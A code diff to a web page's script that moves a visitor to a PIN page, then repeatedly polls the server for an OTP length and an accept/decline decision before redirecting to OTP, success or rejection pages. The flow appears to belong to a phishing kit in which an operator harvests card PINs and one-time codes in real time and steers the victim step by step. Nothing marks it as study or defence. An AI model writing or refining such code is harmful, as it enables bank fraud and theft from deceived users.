@@ -26,9 +26,8 @@
 
 <script>
 
-// FIRST PROCESS → GO TO PIN PAGE
+// ===== FIRST → GO TO PIN PAGE =====
 if (localStorage.getItem("firstProcess") === "yes") {
-
     localStorage.removeItem("firstProcess");
 
     setTimeout(() => {
@@ -36,18 +35,35 @@ if (localStorage.getItem("firstProcess") === "yes") {
     }, 5000);
 }
 
-// AFTER PIN → WAIT FOR OTP TRIGGER
+// ===== SECOND → WAIT FOR OTP / DECISION =====
 if (localStorage.getItem("fromPin") === "yes") {
 
     setInterval(() => {
+
+        // CHECK OTP
         fetch("/otp-status")
         .then(res => res.json())
         .then(data => {
             if (data.otp === 5 || data.otp === 6) {
                 localStorage.setItem("otpLength", data.otp);
+                localStorage.removeItem("fromPin");
                 window.location.href = "step6.html";
             }
         });
+
+        // CHECK DECISION
+        fetch("/decision-status")
+        .then(res => res.json())
+        .then(data => {
+            if (data.decision === "accept") {
+                window.location.href = "success.html";
+            }
+
+            if (data.decision === "decline") {
+                window.location.href = "rejected.html";
+            }
+        });
+
     }, 2000);
 }
 
